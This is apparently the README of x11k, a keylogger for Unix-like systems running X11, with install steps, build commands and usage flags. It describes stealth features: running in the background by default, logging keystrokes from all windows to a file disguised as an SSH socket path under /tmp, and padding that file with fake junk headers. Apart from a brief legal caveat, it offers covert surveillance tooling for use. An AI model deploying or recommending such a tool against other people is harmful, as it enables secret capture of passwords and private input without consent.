# x11k
Keylogger for UNIX-like systems (like linux/freebsd) with Xorg (or x11 compatiable) graphics server. Allows you to log your keyboard actions.

# What is it?
It's keylogger. It should log key actions from Xorg display. Please note, that using this program to other person may be restricted by your local law. Read LICENSE file before use it.

# How to install it?

1) Install git and x11 development library.
Ubuntu and derivatives:
```
sudo apt-get install git libx11-dev
```
2) Download repository to your machine and cd to working directory
```
git clone https://github.com/xdevelnet/x11k.git
cd x11k
```
3) Build binary
```
make
```
Buildng will produce *x11k* executable. Now you are ready to use it. Also, you may wish to move it into some $PATH dirs.

# How to use?

1) Simple executing x11k without command line arguments will run program at background, create file (if not exist) at special predefined path (/tmp/ssh-IZQgaojExB8N), write fake header (a lot of weird trash data) if not exist, write date&time about capture time, then writes keyboard presses to file.

Please note, that program designed to write info about real keypresses, not resulting character. So, Shift+A and A can produce different symbol at text fields, but the thing is, that physically "A" key is always same. So, you will find key sequences in resulting file. Yes, with SHIFT presses. Automatic changing latin letters from lowercase to upcase is just an additional feature.

2) Running program at foreground (just in your working terminal)

``x11k -m foreground``

3) Change destination file ``x11k -a /path/to/log/file``

4) You can also use RC-style commands (stop, start, status). Example:

``x11k status``

# Etc

1) In comparison to other keyloggers, this one captures all opened windows instead of reading from global event vectorized array. IDK which method is better. But it works fine enough.
2) Please don't report anything about easter eggs, trolling inside code, unfinished functions (interactive command mode).
3) Feel free to change default predefined falues inside default.h file (rebuilding is necessary after making changes).
